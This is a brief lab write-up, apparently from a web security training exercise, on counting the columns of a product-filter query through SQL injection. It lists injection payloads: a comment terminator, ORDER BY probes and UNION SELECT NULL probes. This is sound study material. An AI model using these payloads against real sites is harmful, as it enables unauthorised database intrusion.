# Lab 3: SQL injection UNION attack, determining the number of columns returned by the query

## Goal: Find number of columns returned by product filter.

- Confirm Vulnerability:
```bash
'--  (No error - confirms SQLi)
```

- Find Column Count:
```bash
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--  (Error at 3 = 2 columns)
```

- Alternative Method:
```bash
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--  (Works = 2 columns)
```

Key Learning
- ORDER BY errors when column doesn't exist
- UNION SELECT requires matching column count
